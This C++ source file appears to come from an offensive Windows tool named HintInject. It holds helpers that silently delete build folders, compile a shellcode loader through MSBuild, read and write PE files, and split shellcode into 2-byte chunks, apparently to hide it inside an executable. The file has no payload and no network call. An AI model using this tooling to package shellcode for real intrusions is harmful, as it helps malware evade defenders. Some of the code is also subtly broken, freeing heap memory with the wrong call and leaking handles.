#include <Windows.h>
#include <iostream>

void DeleteDirectory(LPCSTR strPath){
	SHFILEOPSTRUCTA strOper = { 0 };
	strOper.hwnd = NULL;
	strOper.wFunc = FO_DELETE;
	strOper.pFrom = strPath;
	strOper.fFlags = FOF_SILENT | FOF_NOCONFIRMATION;

	if (SHFileOperationA(&strOper)) {
		std::cout << "[!] Unicode directory deletion problem" << std::endl;
	}
}

bool DirectoryExists(LPCSTR dirPath){
	DWORD fileType = GetFileAttributesA(dirPath);
	if (fileType == INVALID_FILE_ATTRIBUTES) {
		return false;
	}
	if (fileType & FILE_ATTRIBUTE_DIRECTORY) {
		return true;
	}
	return false;
}

void ClearDirectory() {
	char removedDir1[MAX_PATH] = { 0 };
	char removedDir2[MAX_PATH] = { 0 };
	sprintf_s(removedDir1, "%sx64\\JustLoader\\", SOLUTIONDIR);
	sprintf_s(removedDir2, "%sHintInjectLoader\\x64\\", SOLUTIONDIR);
	if (DirectoryExists(removedDir1)) {
		DeleteDirectory(removedDir1);
	}
	if (DirectoryExists(removedDir2)) {
		DeleteDirectory(removedDir2);
	}
}

char* CompileLoader() {
	ClearDirectory();
	// Find where is the VS compiler
	LPCSTR vsWhere = "\"\"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath\"";
	// Run it
	FILE* pipe = _popen(vsWhere, "rt");
	if (pipe != NULL) {
		char compilerPath[MAX_PATH] = { 0 };
		char fullCommand[2*MAX_PATH] = { 0 };
		char* loaderBinaryPath = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
		if (loaderBinaryPath == NULL) {
			std::cout << "[!] Error on Heap Allocation !" << std::endl;
			return NULL;
		}
		// Find the compiler path
		if (fgets(compilerPath, MAX_PATH, pipe) != NULL) {
			//Remove new line
			compilerPath[strlen(compilerPath) - 1] = '\0';
			sprintf_s(fullCommand, "\"\"%s\\MSBuild\\Current\\Bin\\MSBuild.exe\" %s\\HintInject.sln /t:HintInjectLoader /property:Configuration=JustLoader /property:RuntimeLibrary=MT\"\n", compilerPath, SOLUTIONDIR);
			// Compile the loader
			FILE* pipe2 = _popen(fullCommand, "rt");
			_pclose(pipe2);
			memset(fullCommand, 0x00, MAX_PATH);
			sprintf_s(fullCommand, "%sx64\\JustLoader\\HintInjectLoader.exe", SOLUTIONDIR);
			memcpy(loaderBinaryPath, fullCommand, MAX_PATH);
			// Check the binary is compiled
			if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(loaderBinaryPath) && GetLastError() == ERROR_FILE_NOT_FOUND) {
				std::cout << "[!] Compiled binary not found!" << std::endl;
				free(loaderBinaryPath);
				return NULL;
			}
			else {
				return loaderBinaryPath;
			}
		}
		else {
			std::cout << "[!] Visual Studio compiler path is not found! " << std::endl;
			return NULL;
		}
		_pclose(pipe);
		return NULL;
	}
	return NULL;
}

PBYTE ReadFileFromDisk(LPCSTR fileName, uint64_t& fileSize) {
	HANDLE hFile = CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open the file\n";
		std::cout << GetLastError() << std::endl;
		return NULL;
	}
	fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		std::cout << ("Failed to get the file size\n");
		return NULL;
	}
	PBYTE fileBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
	if (!fileBuffer) {
		std::cout << ("Failed to get the file size\n");
		return NULL;
	}
	DWORD dwBytesRead = 0;
	if (ReadFile(hFile, fileBuffer, fileSize, &dwBytesRead, NULL) == FALSE) {
		std::cout << ("Failed to alloc a buffer!\n");
		return NULL;
	}
	if (dwBytesRead != fileSize) {
		std::cout << ("Size problem!\n");
		return NULL;
	}
	CloseHandle(hFile);
	return fileBuffer;
}


bool WriteNewPE(LPCSTR fileName, PBYTE buffer, uint64_t size) {
	HANDLE hFile = CreateFileA(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWritten = 0;
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Terminal failure: Unable to open file for write.\n";
		return false;
	}

	if (!WriteFile(hFile, buffer, size, &dwBytesWritten, NULL)) {
		std::cout << "Write failure.\n";
		return false;
	}
	CloseHandle(hFile);
	return true;
}

PBYTE SplitShellcode(PBYTE shellcodeBuffer, uint64_t sizeOfShellcode, uint64_t& numberOfChunks) {
	numberOfChunks = ceil(sizeOfShellcode / 2.0);
	PBYTE returnValue = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfChunks * sizeof(WORD));
	if (returnValue == NULL) {
		std::cout << "Error on heap allocation !" << std::endl;
		return NULL;
	}
	// May not be required
	memset(returnValue, 0x00, sizeof(WORD) * numberOfChunks);
	memcpy(returnValue, shellcodeBuffer, sizeOfShellcode);
	return returnValue;
}

int GetRandomNumber(int min, int max) {
	return min + rand() % ((max + 1) - min);
}